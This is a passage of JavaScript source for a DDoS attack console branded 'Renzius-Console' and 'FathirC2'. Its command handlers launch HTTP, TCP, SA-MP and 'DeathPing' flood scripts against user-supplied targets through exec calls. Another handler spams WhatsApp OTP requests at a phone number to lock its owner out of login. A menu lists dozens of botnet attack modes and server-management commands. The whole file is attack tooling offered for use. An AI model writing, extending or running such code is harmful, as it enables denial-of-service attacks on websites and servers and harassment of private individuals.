⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;35m  \x1b[31m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀ \x1b[1;35m     Host   ;[\x1b[1m\x1b[37m ${target} \x1b[1;35m]
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄ \x1b[1;35m     Port   :[\x1b[1m\x1b[37m 443 \x1b[1;35m]
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀ \x1b[1;35m     Time   :[\x1b[1m\x1b[37m ${duration} \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀ \x1b[1;35m     Methods:[\x1b[1m\x1b[37m raw \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;37m  \x1b[31m\x1b[47mTarget Details\x1b[0m
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀\x1b[1;34m      ASN    :[\x1b[1m\x1b[37m ${result.as} \x1b[1;34m]
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀ \x1b[1;34m     ISP    :[\x1b[1m\x1b[37m ${result.isp} \x1b[1;34m]
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀  \x1b[1;34m    IP     :[\x1b[1m\x1b[37m ${result.query} \x1b[1;34m]
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀  \x1b[1;31m    \x1b[31m\x1b[47mCREDITS\x1b[0m
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀    \x1b[1;96m  Owner  :[\x1b[1m\x1b[37m @Renzuis \x1b[1;35m] 
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀    \x1b[1;96m  Telegram:[\x1b[1m\x1b[37m https://t.me/RenzuisTresser \x1b[1;35m]
═══════════════════════════════════════════════════════════════════════════════⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀   
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/14`);
exec(`node ${metode} ${target} ${duration}`)
sigma()
};
// [========================================] //
async function stars(args) {
  if (args.length < 3) {
    console.log(`Example: .stars <target> <port>  <duration>
zx https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
                                           \x1b[1;31m    \x1b[31m\x1b[47m- [powered by FathirC2] -\x1b[0m
                                          \x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;35m  \x1b[31m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀ \x1b[1;35m     Host   ;[\x1b[1m\x1b[37m ${target} \x1b[1;35m]
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄ \x1b[1;35m     Port   :[\x1b[1m\x1b[37m 443 \x1b[1;35m]
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀ \x1b[1;35m     Time   :[\x1b[1m\x1b[37m ${duration} \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀ \x1b[1;35m     Methods:[\x1b[1m\x1b[37m stars \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;37m  \x1b[31m\x1b[47mTarget Details\x1b[0m
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀\x1b[1;34m      ASN    :[\x1b[1m\x1b[37m ${result.as} \x1b[1;34m]
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀ \x1b[1;34m     ISP    :[\x1b[1m\x1b[37m ${result.isp} \x1b[1;34m]
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀  \x1b[1;34m    IP     :[\x1b[1m\x1b[37m ${result.query} \x1b[1;34m]
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀  \x1b[1;31m    \x1b[31m\x1b[47mCREDITS\x1b[0m
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀    \x1b[1;96m  Owner  :[\x1b[1m\x1b[37m @Renzuis \x1b[1;35m] 
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀    \x1b[1;96m  Telegram:[\x1b[1m\x1b[37m https://t.me/RenzuisTresser \x1b[1;35m]
═══════════════════════════════════════════════════════════════════════════════⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀   
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/15`);
exec(`node ${metode} ${target} ${duration} 64 10 proxy.txt`)
sigma()
};
// [========================================] //
async function http1(args) {
  if (args.length < 3) {
    console.log(`Example: .http <target> <port>  <duration>
http1 https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
                                           \x1b[1;31m    \x1b[31m\x1b[47m- [powered by FathirC2] -\x1b[0m
                                          \x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;35m  \x1b[31m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀ \x1b[1;35m     Host   ;[\x1b[1m\x1b[37m ${target} \x1b[1;35m]
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄ \x1b[1;35m     Port   :[\x1b[1m\x1b[37m 443 \x1b[1;35m]
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀ \x1b[1;35m     Time   :[\x1b[1m\x1b[37m ${duration} \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀ \x1b[1;35m     Methods:[\x1b[1m\x1b[37m http1 \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;37m  \x1b[31m\x1b[47mTarget Details\x1b[0m
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀\x1b[1;34m      ASN    :[\x1b[1m\x1b[37m ${result.as} \x1b[1;34m]
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀ \x1b[1;34m     ISP    :[\x1b[1m\x1b[37m ${result.isp} \x1b[1;34m]
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀  \x1b[1;34m    IP     :[\x1b[1m\x1b[37m ${result.query} \x1b[1;34m]
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀  \x1b[1;31m    \x1b[31m\x1b[47mCREDITS\x1b[0m
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀    \x1b[1;96m  Owner  :[\x1b[1m\x1b[37m @Renzuis \x1b[1;35m] 
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀    \x1b[1;96m  Telegram:[\x1b[1m\x1b[37m https://t.me/RenzuisTresser \x1b[1;35m]
═══════════════════════════════════════════════════════════════════════════════⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀   
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/16`);
exec(`node ${metode} ${target} ${duration}`)
sigma()
};
// [========================================] //
async function killOTP(args) {
  if (args.length < 2) {
    console.log(`Example: kill-otp <target> <duration>
kill-otp 628xxx 120`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀
   
                    OTP Killer Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}

Spamming WhatsApp OTP That Can Annoy Someone Or Maybe Make Them Cannot Login`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/21`);
exec(`node ${metode} +${target} ${duration}`)
sigma()
};
// [========================================] //
async function samp(args) {
  if (args.length < 3) {
    console.log(`Example: .samp <target> <port> <duration>
samp 123.456.78.910 7777 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀

                    SA MP Flood Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : SAMP Flooder
Creator  : FathirC2`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/22`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function DeathPing(args) {
  if (args.length < 3) {
    console.log(`Example: DeathPing <target> <duration>
DeathPing 123.456.78.910 120`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀

                    DeathPing Flood Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : TCP FLOOD
Creator  : V3 And Renzius`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/23`);
const sikma = path.join(__dirname, `/lib/cache/1`);
exec(`node ${metode} ${target} ${port} ${duration} 10`)
exec(`node ${sikma} http://${target} ${duration}`)
sigma()
};
// ================================================== //
async function chat_ai() {
permen.question('[\x1b[1m\x1b[31m Chat AI\x1b[0m]: \n', async (yakin) => {
if (yakin === 'exit') {
  console.log(`Chat Ai Has Ended`)
  sigma()
} else {
  try {
let skidie = await axios.get(`https://widipe.com/gpt4?text=${yakin}`)
let kiddies = await skidie.data
console.log(`
[ Ragbot ]:
${kiddies.data}
`)
  } catch (error) {
      console.log(error)
  }
  chat_ai()
}})
}
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
Created And Coded Full By V3

Thx To:
Allah SWT
Permen (base)
Renzius Sikma (My Friend)
Ryan Dahl (pembuat nodejs)
Chat Gpt 
`
permen.question(
'╭─[\x1b[1;37m\x1b[31m\x1b[47mRenzius-Console\x1b[0m]: \n╰┈┈┈┈➤',(input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'help') {
    console.log(`
NAME      │ ALIAS              │ DESCRIPTION
──────────┼────────────────────┼────────────────────────────────────
 help     │ ----               │ Menunjukan Semua Command
 methods  │ ----               │ Menunjukan Semua Methods
 botnet-methods | ----          | Menunjukkan Semua Methods Botnet 
 clear    │ ----               │ Menunjukan Banner mu
 monitor  │ ----               │ Menumjukan serangan
 tutorial │ ----               │ Tutorial Penggunaan
 credits  │ ----               │ credits
 news     │ ----               │ Melihat news update
`);
    sigma();
  } else if (command === 'botnet-methods') {
  	console.log(`
█░░ ▄▀█ █▄█ █▀▀ █▀█ ▀▀█     
█▄▄ █▀█ ░█░ ██▄ █▀▄ ░░█ 

──────────────────────[SERVER OPERATIONS]──────────────────────
   • botnet   - Launch Attack with Server
   • test     - Check Server Status
   • addsrv     - Add New Server
┌────────────────────────────┐
│         Attack Modes       │
├────────────────────────────┤
│ ➤ https         │ ➤ api         │
│ ➤ zx         │ ➤ bypass        │
│ ➤ mix           │ ➤ h2raw         │
│ ➤ strike        │ ➤ tlsvip        │
│ ➤ tlsv2         │ ➤ storm         │
│ ➤ destroy       │ ➤ httpx         │
│ ➤ java          │ ➤ uam           │
│ ➤ harder        │ ➤ http-raw      │
│ ➤ sigma         │ ➤ glory         │
│ ➤ pluto         │ ➤ medusa        │
│ ➤ udp           │ ➤ tcp           │
│ ➤ pidoras       │ ➤ stars         │
│ ➤ capca         │ ➤ exe           |
 |  ➤ browser         | 
└────────────────────────────┘

`);
    sigma();
  } else if (command === 'methods') {
    methods()
    sigma();
  } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'gataulah') {
    handleAttackCommand(args);
  } else if (command === 'tutorial') {
  	console.log(`
 Tutorial Menggunakan
 methods target port time
 contoh => tlsvip https://website.com 443 60`);
    sigma();
  } else if (command === 'udp-raw') {
    udp_flood(args);
  } else if (command === 'zx') {
  	zx(args);
  } else if (command === 'tlsvip') {
  	tlsvip(args);
  } else if (command === 'api') {
  	api(args);
  } else if (command === 'httpx') {
  	httpx(args);
  } else if (command === 'glory') {
  	glory(args);
  } else if (command === 'https') {
  	https(args);
  } else if (command === 'sigma') {
  	sigma(args);
  } else if (command === 'pidoras') {
  	pidoras(args);
  } else if (command === 'bypass') {
  	bypass(args);
  } else if (command === 'java') {
  	java(args);
  } else if (command === 'strike') {
  	strike(args);
  } else if (command === 'xyn') {
  	xyn(args);
  } else if (command === 'storm') {
  	storm(args);
  } else if (command === 'raw') {
  	raw(args);
  } else if (command === 'stars') {
  	stars(args);
  } else if (command === 'http1') {
  	http1(args);
  } else if (command === 'kill-do') {
  	killDo(args);
  } else if (command === 'samp') {
  	samp(args);
  } else if (command === 'kill-otp') {
  	killOTP(args);
  } else if (command === 'DeathPing') {
  	DeathPing(args);
  } else if (command === 'spampair') {
  	SpamPair(args);
  } else if (command === 'kill-ping') {
    pod(args);
    } else if (command === 'addsrv') {
    processBotnetEndpoint(args);
  } else if (command === 'test') {
    checkBotnetEndpoints()
  } else if (command === 'botnet') {
    AttackBotnetEndpoints(args);
  } else if (command === 'monitor') {
    monitorAttack()
    sigma()
  } else if (command === 'ai') {
    console.log(`ZyoJir Ai Ragbot Started
Type "exit" To Stop Chat`);
    chat_ai()
  } else if (command === 'clear') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()